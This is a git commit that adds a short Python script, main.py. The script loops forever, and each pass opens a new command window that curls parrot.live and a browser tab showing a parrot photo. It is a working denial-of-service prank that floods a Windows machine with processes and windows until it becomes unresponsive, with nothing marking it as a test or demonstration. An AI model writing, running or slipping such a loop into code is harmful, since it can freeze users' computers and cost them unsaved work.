2b8c09b5995ff86ec69dfa256b907c3e309338b5
Vodkarm06 <79284263+Vodkarm@users.noreply.github.com>
2022-09-20 22:21:23 +0200

    Add files via upload

---
+++ main.py
@@ -0,0 +1,5 @@
+import os
+
+while True:
+    os.system("start cmd /c curl parrot.live")
+    os.system("start https://static9.depositphotos.com/1036149/1155/i/600/depositphotos_11556539-stock-photo-fun-parrot-with-glasses.jpg")
